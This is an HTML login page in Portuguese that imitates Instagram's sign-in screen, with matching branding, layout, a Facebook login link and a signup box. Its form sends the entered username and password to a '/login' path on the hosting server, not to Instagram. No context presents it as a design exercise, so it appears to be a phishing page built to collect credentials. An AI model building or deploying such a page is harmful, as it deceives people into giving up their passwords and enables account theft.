<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; }
        .logo { margin: 22px auto 12px; width: 175px; display: block; }
        form { display: flex; flex-direction: column; margin-top: 24px; }
        input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px; margin-bottom: 6px; font-size: 12px; }
        button { background-color: #0095f6; border: none; border-radius: 4px; color: #fff; font-weight: bold; padding: 7px; margin: 8px 0; cursor: pointer; }
        .divider { display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: bold; margin: 15px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin: 10px 0; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; margin-top: 12px; display: block; }
        .signup-box { width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; margin-top: 10px; text-align: center; font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: bold; text-decoration: none; }
    </style>
</head>
<body>
    <div>
        <div class="container">
            <h1 style="font-style: italic; font-size: 40px; margin-bottom: 20px;">Instagram</h1>
            
            <form action="/login" method="POST">
                <input type="text" name="email" placeholder="Telefone, nome de usuário ou email" required>
                <input type="password" name="password" placeholder="Senha" required>
                <button type="submit">Entrar</button>
            </form>

            <div class="divider">OU</div>
            
            <a href="#" class="fb-login">Entrar com o Facebook</a>
            <a href="#" class="forgot">Esqueceu a senha?</a>
        </div>

        <div class="signup-box">
            Não tem uma conta? <a href="#">Cadastre-se</a>
        </div>
    </div>
</body>
</html>
